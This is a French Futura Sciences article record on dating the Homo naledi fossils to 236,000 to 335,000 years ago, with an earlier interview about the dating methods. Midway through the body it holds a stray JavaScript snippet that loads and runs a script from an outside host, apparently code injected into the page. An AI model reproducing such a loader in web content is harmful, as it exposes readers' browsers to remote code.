{"title": "Homo naledi : sa surprenante jeunesse est confirmée", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "10/05/2017", "content": "Homo naledi  est peut-être la plus ancienne espèce du genre  Homo  capable d'enterrer ses morts. Aujourd'hui, c'est officiel : il était bien présent en Afrique du Sud il y a entre 236.000 et 335.000 ans. Ses représentants pourraient donc avoir côtoyé l'Homme moderne, qui serait apparu il y a 200.000 ans. Ce qu'il faut retenir Homo naledi  est une nouvelle espèce d’hominine présentant des caractéristiques primitives et modernes. Celle-ci a été découverte il y a quelques années en Afrique du Sud. Doué d’un petit cerveau,  Homo naledi  n’en était pas moins capable d’enterrer ses morts dans une grotte pour les protéger des charognards, ce qui est très étonnant. L’âge des fossiles retrouvés vient d'être précisé : entre 236.000 et 335.000 ans, et pas quelques millions d’années comme on pouvait le penser. Il y a presque deux semaines, Futura relayait la nouvelle : le paléontologue Lee Berger avait annoncé dans une interview accordée à  National Geographic  que les restes fossilisés de  Homo  naledi  avaient finalement pu être datés. L'âge obtenu était compris entre 200.000 et 300.000 ans, ce qui, bien que moins révolutionnaire que s'il avait été compris entre un et deux millions d'années, n'en restait pas moins étonnant pour ce représentant du genre  Homo . Ses caractéristiques anatomiques sont en effet un étrange mélange :  Un  cerveau  minuscule, de la taille d'une orange. Haut d'environ 1,5 mètre, il pesait environ 45  kilogrammes .  Les dents et le  crâne  de  Homo naledi  sont semblables à ceux des premiers membres connus du genre  Homo , à savoir  Homo rudolfensis  et  Homo habilis , qui sont apparus il y a environ deux millions d'années. Les épaules sont cependant plus semblables à celles des singes et les doigts, extrêmement courbés, suggèrent une capacité d'escalade.  Les pieds sont pourtant semblables à ceux des humains modernes ; les jambes, relativement longues, suggèrent qu'il était bien adapté à la marche sur de longues distances. Cette vidéo présente rapidement les caractéristiques essentielles de la découverte des restes fossilisés d’ Homo naledi . Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais apparaissent alors. Cliquez ensuite sur la roue dentée à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © Barcroft TV, YouTube Les caractéristiques anatomiques de  Homo naledi  sont donc archaïques par bien des aspects, ce qui aurait tendance à le placer proche de  Homo habilis  sur l' arbre phylogénétique  des hominines. Toutefois, ses caractéristiques sont bien plus évoluées par d'autres aspects. Ainsi, malgré son petit cerveau,  Homo naledi  semblait bien avoir délibérément enterré ses morts, un comportement sophistiqué que l'on ne connaissait jusqu'ici qu'avec l'Homme de  Néandertal  et l'Homme de Cro-Magnon. Lee Berger, chef des équipes ayant découvert et étudié les  fossiles  de  Homo naledi , envisageait donc que celui-ci pouvait bien être à l'origine de certains outils en pierre taillée assez avancés, retrouvés dans la région d'Afrique du Sud où avait vécu  Homo naledi . Cependant, ces hypothèses dataient de 2015 et on ne savait toujours pas par quels moyens les chercheurs étaient finalement parvenus à dater les fossiles ni quel âge exact ils avaient obtenu. On n'en savait pas plus non plus sur la découverte annoncée d'une deuxième grotte.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Six méthodes de datation convergentes pour  Homo naledi Ce n'est plus le cas désormais, comme le montre une publication dans le journal  eLife  et plusieurs communiqués (voir ci-dessous) en provenance des universités à la pointe des recherches sur  Homo naledi  ainsi que la mise en ligne d'une vidéo dans laquelle Lee Berger fait un point rapide sur les dernières découvertes. Young Homo naledi surprises  ; JCU team says hominid lived alongside modern humans . Les fossiles retrouvés dans les grottes de  Rising Star , en Afrique du Sud, ont un âge compris entre 236.000 et 335.000 ans, donc pendant le  Pléistocène  moyen, ce qui confirme que  Homo naledi  a très probablement côtoyé  Homo sapiens . La détermination de cet âge n'a pas été une mince affaire. En effet, 10 laboratoires et 19 chercheurs ont été mis a contribution et 6 méthodes différentes ont été utilisées sous l'égide du professeur Paul Dirks de la  James Cook University , en Australie. Futura avait interrogé deux des collègues de Paul Dirks au sujet de la découverte de  Homo naledi , à savoir  Eric Roberts  et  Cassian Pirard . Ceux-ci avaient répondu à nos questions (voir l'interview ci-dessous) avec l'aval de Paul Dirks. Voici celle qui nous intéresse le plus aujourd'hui. Futura : Quelles méthodes de datation ont été tentées ? Y a-t-il de l'espoir dans un avenir proche d'obtenir une datation et si oui comment ? Eric Roberts :  Nous avons essayé plusieurs techniques, dont la datation par l' uranium-plomb . Nous avons eu des problèmes pour obtenir un âge jusqu'à présent. Mais nous progressons et nous emploierons tout ce qui est possible pour obtenir un âge précis et fiable pour les fossiles. Nous pensons réussir, mais ça va prendre du temps. Cassian Pirard :  Les datations U-Th-He sur les encroûtements carbonatés n'ont rien donné jusqu'à présent, faute d'une technique adéquate. Mais  Jan Kramers , un célèbre géochronologiste présent parmi les auteurs de l'article de  eLife , est en train de développer une méthode appropriée pour dater de manière plus adéquate les spéleothemes, appelés plus couramment  concrétions , de  Rising Star . Des échantillons de  sédiments  carbonatés sont d'ailleurs en cours d'analyse dans notre université et devraient donner des résultats plausibles d'ici quelques mois, en utilisant les séries de désintégration de l' uranium . Cela nous donnera un âge minimum pour les fossiles. Une datation des sédiments par OSL ( Optically Stimulated Luminescence ) va être tentée également ainsi qu'une datation directe des dents de  Homo naledi  par ESR ( Résonance de spin électronique ). Elle pourrait finalement nous donner un âge, même si c'est avec des barres d'erreurs assez importantes. Lee Berger nous explique les dernières découvertes concernant  Homo naledi . Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais apparaissent alors. Cliquez ensuite sur la roue dentée à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». ©  Wits University OFFICIAL Avec le recul, on ne peut que saluer la clairvoyance des chercheurs de la  James Cook University . Les datations directes ont bien été effectuées sur des dents de  Homo naledi  en utilisant la méthode ESR ainsi que celle des déséquilibres des familles de l'uranium dans le cadre des tests en double aveugle. Les datations indirectes, quant à elles, ont bien été effectuées avec la méthode OSL pour les sédiments, jointe à la méthode par l'uranium-thorium, complétée par l'étude du  magnétisme  rémanent dans les spéléothèmes. Comme l'explique Lee Berger dans la vidéo ci-dessus, les recherches continuent et d'autres fossiles de  Homo naledi  ont été découverts dans une nouvelle grotte appelée  Lesedi . Pour en savoir plus Homo naledi  : il ne serait âgé que de 250.000 ans Article de  Laurent Sacco  publié le 27/04/2017 En 2015,  Homo naledi  avait défrayé la chronique en 2015 après l'annonce de la découverte de cet hominine qui, bien que d'apparence primitive, était capable d'enterrer ses morts. Les fossiles trouvés pouvaient être âgés de quelques millions d'années, ce qui aurait été stupéfiant. Il semble, à présent, qu'ils soient beaucoup plus jeunes : environ 250.000 ans. Une bombe avait explosé en 2015 après l'annonce de la découverte en Afrique du Sud de  Homo naledi . L'équipe de chercheurs dirigée par le paléontologue Lee Berger avait fait sensation et dérangé quelques-uns de leurs collègues en médiatisant rapidement les fouilles et les premières analyses des fossiles réalisées avec l'aide de  National Geographic . Le magazine avait couvert la découverte de ce nouvel hominine dans le « berceau de l'humanité » ( Cradle of Humankind ), une région d'Afrique du Sud située à environ 50 km au nord-ouest de Johannesburg, plus précisément dans les grottes de  Rising Star . Il faut dire que les restes de squelettes appartenant visiblement à un membre de la famille  Homo  semblaient raconter une histoire à peine croyable. Les indices montraient en effet un comportement qui semblait jusque-là réservé aux hominines avec de grands cerveaux et arrivés tout dernièrement sur l' arbre  de l'évolution, à savoir  Homo neanderthalensis  et  Homo sapiens.  Comment croire que des représentants du genre  Homo  avec une petite taille, un petit cerveau (la  boîte crânienne  est légèrement plus volumineuse que celle d'un  chimpanzé ) aient pu délibérément enterrer leurs morts dans une caverne afin de les soustraire aux charognards il y a peut-être plusieurs millions d'années, comme le suggéraient notamment certaines caractéristiques très primitives de leur  anatomie  ? Ne s'agissait-il pas, plutôt, d'une  espèce  qui aurait vécu il y a seulement quelques centaines de milliers d'années tout au plus, ce qui, bien que toujours étonnant, ne serait pas aussi révolutionnaire ? Il est clair en effet que l'existence d'humains capables de rituels funéraires il y a quelques millions d'années, et donc avec un état de conscience avancée aussi tôt dans l'histoire des hominines, bouleverserait considérablement nos idées sur qui nous sommes. La chronologie actuelle des membres les plus célèbres du genre  Homo . © A. Cuadra,  Science                               Homo naledi  pourrait avoir côtoyé l’Homme moderne Pour tenter d'y voir plus clair, il fallait pouvoir dater exactement les os des défunts de  Homo naledi , mais comme Éric Roberts et Cassian Pirard l'avait expliqué à Futura dans l'interview ci-dessous, la tâche n'était nullement évidente. Les chercheurs ne disposaient pas de fossiles d'animaux ou de plantes accompagnant les restes d' Homo naledi  qui auraient pu correspondre à des périodes géologiques bien datées. Les méthodes de datation isotopiques étaient difficiles à mettre en œuvre (rappelons d'ailleurs que celle basée sur le  carbone 14  ne permet pas de remonter de façon fiable au-delà de quelques dizaines de milliers d'années). Tout espoir n'était pas perdu cependant et il semble que les chercheurs aient finalement touché au but si l'on en croit une récente déclaration faite par Lee Berger dans une interview qu'il a accordée, sans surprise, à  National Geographic . Les restes retrouvés de  Homo naledi  seraient âgés de 200.000 à 300.000 ans. On n'en sait pas plus pour l'instant car aucun article scientifique expliquant en particulier par quelle méthode cette datation a été obtenue n'a encore été publié. Lee Berger a seulement ajouté qu'une deuxième grotte contenant des restes de  Homo naledi  avait été découverte. Peut-être contenait-elle des indications permettant de trancher entre diverses hypothèses. Voir aussi : L’Homme de Florès, dit le Hobbit, serait bien plus ancien qu’on ne le pensait Toujours est-il que l'on aurait là une preuve de plus que l'évolution humaine était particulièrement buissonnante et que de nombreuses espèces d'hominines ont cohabité. À vrai dire, il y a un moment déjà que l'on a abandonné l'image linéaire d'une espèce succédant à une autre, des  australopithèques  à l'Homme de Cro-Magnon. Si  Homo naledi  a effectivement vécu il y a 250.000 ans environ, il a peut-être côtoyé  Homo sapiens  et c'est peut-être lui qui l'a fait disparaitre, directement ou indirectement en occupant sa niche écologique. À cet égard on peut penser au cas de  Homo floresiensis ,  lui aussi de petite taille et avec des caractéristiques primitives suggérant que dans les deux cas, ils dérivent d'espèces humaines primitives, comme  Homo habilis , qui auraient survécu pendant des centaines de milliers d'années à côté d'espèces humaines, plus évoluées.  Homo floresiensis  semble avoir disparu d'Indonésie il y a 50.000 ans précisément au moment où arrive  Homo sapiens . Mais nous n'en sommes encore qu'au stade des spéculations... Comment dater  Homo naledi  ? Une interview exclusive Article de Laurent Sacco publié le 15/09/2015 La découverte en Afrique du Sud de  Homo naledi , une nouvelle espèce d'hominine, laisse bien des questions en suspens. Les nombreux restes fossilisés trouvés dans la cavité Dinaledi, c'est-à-dire la  cavité des  étoiles  en langue Sotho, pourraient changer notre conception de l'histoire du genre  Homo  s'ils sont âgés de quelques millions d'années. Futura a interrogé l'un des chercheurs impliqués dans cette découverte : Eric Roberts. Cette photo, publiée dans le numéro d’octobre de National Geographic magazine est une reconstruction de l’aspect de Homo naledi effectuée par le paléoartiste John Gurche. Elle lui a demandé 700 heures de travail. © Mark Thiessen, National Geographic                               Eric Roberts  est un spécialiste en sédimentologie, aussi bien du point de vue de la géochronologie que du point de vue des implications en  paléontologie . Le chercheur est en poste à la  James Cook University  en Australie. Il se trouve que c'est aussi un spéléologue et c'est pourquoi on ne sera pas étonné d'apprendre qu'il a fait partie de ceux qui ont été autorisés à pénétrer dans les grottes de  Rising Star  en Afrique du Sud, désormais sous le  feu  des  projecteurs  avec la découverte de  Homo naledi . Il a également fait partie, avec son collègue  Paul Dirks , géologue et professeur dans la même université, de l'aréopage de spécialistes rassemblés par le paléoanthropologue Lee Berger autour de cette découverte. Eric Roberts et Paul Dirks figurent donc au nombre des auteurs de l'article publié par le  journal  eLife  qui fait couler le plus d'encre  numérique , celui qui propose l'hypothèse que  Homo naledi  partageait avec  Homo sapiens  des pratiques funéraires. Cassian Pirard , également en poste à la  James Cook University  en Australie, est lui pétrologiste et géochimiste. Il connaît bien les deux hommes puisqu'il fait entre autres de la spéléologie avec son collègue Eric Roberts. Les membres du forum de Futura connaissent bien également Cassian puisqu'il est l'un des modérateurs. Par son intermédiaire, nous avons pu poser quelques questions à Eric Roberts, au sujet de l'étonnante, mais controversée, découverte de ce qui semble bien être des traces de pratiques d'inhumation des défunts du nouvel hominine dans la cavité Dinaledi. Voici donc les réponses d'Eric Roberts, avec l'adhésion de Paul Dirks et des compléments d'information tirés de discussions avec Éric Roberts par Cassian Pirard. Il nous a ainsi confié que comme il pratiquait souvent l'escalade et la spéléologie avec son collègue, celui-ci lui avait déjà raconté qu'en ce qui concerne cette cavité :  « c'est vraiment un site difficile où il faut avoir au moins quelques années de spéléologie derrière soi pour y accéder sans aide externe et ne pas être trop baraqué. Paul Dirks (un grand hollandais) est incapable d'y entrer et ce n'est pas faute d'avoir essayé. Éric, plus petit et svelte, a pu y pénétrer, mais cela lui prenait toujours une dizaine de minutes de contorsions » . Mais entrons dans le vif du sujet... Éric Roberts en train de ramper dans l’une des grottes de  Rising Star  en direction de la cavité Dinaledi. ©  James Cook University                               Futura : À quel moment l'équipe a commencé à envisager l'hypothèse que l'on était en présence des plus anciennes traces de pratique faisant penser à de l'inhumation ? Quelle a été sa réaction ? Eric Roberts :  L'idée a commencé à faire son chemin juste après la première excavation, quand il est devenu manifeste qu'il n'y avait pas des fossiles d'animaux dans la cavité et qu'aucun des os ne portait de traces de traumatismes ou de l'activité de  carnivores . Notre première réaction a été que nous devions regarder plus soigneusement les informations disponibles et examiner avec plus d'attention la cavité. C'est ce que nous avons fait et tout a continué à nous indiquer que l'on était bien en présence d'un assemblage  monospécifique  de fossiles avec peu d'autres interprétations possibles. Comment l'hypothèse a-t-elle été reçue quand vous avez commencé à en parler à la communauté scientifique ? Eric Roberts :  Je pense que la plupart des gens ont réagi en disant qu'il devait y avoir une autre manière de pénétrer dans la cavité, ou qu'il devait y avoir une autre explication. Toutefois, lorsqu'ils ont été confrontés aux données et au raisonnement derrière notre hypothèse, ils sont arrivés comme nous à la même conclusion. Les articles n'ont pas été publiés dans  Nature  ou  Science , pourquoi ? Eric Roberts :  Eh bien, tout ce travail est en fait une expérience pour changer la façon dont nous faisons et publions de la science. Plutôt que de faire de la rétention d'informations comme s'il s'agissait d'un secret important, et en ne permettant qu'à un groupe de chercheurs sélectionnés d'avoir accès aux fossiles, Lee Berger a ouvert la découverte au public et à d'autres experts depuis le tout début. Il a permis à un large groupe de jeunes chercheurs de venir en Afrique du Sud pour participer à l'analyse des fossiles. Notre décision de publier dans un journal en accès libre en ligne,  eLife , est en droite ligne de la philosophie derrière ce projet. Cette deuxième vidéo complète la première en montrant des images de la découverte des fossiles de  Homo naledi , suivie par  National Geographic . On voit aussi une reconstitution de l'aspect probable de  Homo naledi . Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais apparaissent alors. Cliquez ensuite sur la roue dentée à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». ©  National Geographic , YouTube Est-il exact que les fouilles n'ont permis d'explorer qu'une petite partie des dépôts sédimentaires ? On a seulement gratté la surface pour ainsi dire, il doit donc rester bien plus de fossiles de  Homo naledi  que l'on n'en a trouvé pour le moment, étant donné la richesse de ce que l'on a déjà découvert. Eric Roberts :  Parfaitement. Nous avons fait une étude minutieuse de la sédimentologie de la cavité Dinaledi, mais nous avons seulement excavé une petite partie du sol, celle qui a livré le plus de fossiles. Il est tout à fait possible, et en fait nous en sommes presque certains, que bien plus de fossiles de  Homo naledi  soient encore sur place, attendant d'être déterrés. Cassian Pirard :  Il y a différents niveaux dans la chambre, séparés par des  planchers  de  précipitations  carbonatées et des niveaux de sédiments qui n'ont pas encore été explorés. Une des prochaines étapes sera d'amener du matériel de géophysique, entre autres un  Ground Penetrating Radar  (GPR), dans la  chatière  pour explorer ce qui se cache dans les zones encore non excavées. Quelles méthodes de datation ont été tentées ? Y a-t-il de l'espoir dans un avenir proche d'obtenir une datation et si oui comment ? Eric Roberts :  Nous avons essayé plusieurs techniques, dont la datation par l' uranium-plomb . Nous avons eu des problèmes pour obtenir un âge jusqu'à présent. Mais nous progressons et nous emploierons tout ce qui est possible pour obtenir un âge précis et fiable pour les fossiles. Nous pensons réussir, mais ça va prendre du temps. Cassian Pirard :  Les datations U-Th-He sur les encroûtements carbonatés n'ont rien donné jusqu'à présent, faute d'une technique adéquate. Mais  Jan Kramers , un célèbre géochronologiste présent parmi les auteurs de l'article de  eLife , est en train de développer une méthode appropriée pour dater de manière plus adéquate les spéleothemes, appelés plus couramment concrétions, de  Rising Star . Des échantillons de sédiments carbonatés sont d'ailleurs en cours d'analyse dans notre université et devraient donner des résultats plausibles d'ici quelques mois, en utilisant les séries de désintégration de l'uranium. Cela nous donnera un âge minimum pour les fossiles. Une datation des sédiments par OSL ( Optically Stimulated Luminescence ) va être tentée également ainsi qu'une datation directe des dents de  Homo naledi  par ESR ( Résonance de Spin Electronique ). Elle pourrait finalement nous donner un âge, même si c'est avec des barres d'erreurs assez importantes. Même si l'on n'a pas de date, quelle est celle qui est la plus probable si l'on pense à l'anatomie de  Homo naledi  et par la même occasion, sa place la plus probable dans l'arbre des hominines, selon l'équipe ? Éric Roberts :  Vous savez nous ne voulons vraiment pas faire trop de spéculations à ce sujet. Il nous faut des certitudes. Je pense que toutes les dates entre trois millions d'années et dix mille ans sont possibles. Si les fossiles sont récents peut-on imaginer trouver de l' ADN  ? Eric Roberts  : Nous allons essayer. Quel effet ça fait de se retrouver dans la grotte de  Homo naledi  ? On pense à la trajectoire qui vous a mené à devenir un chercheur qui se penche sur les origines de l'humanité, avec des réflexions philosophiques ? Eric Roberts :  On se sent vraiment excité d'être impliqué dans la découverte et le contexte d'un site de fossiles si important. Je suis juste très fier d'être en mesure de contribuer à mon humble niveau à la compréhension des origines de l'Homme. ", "theme": "planete"}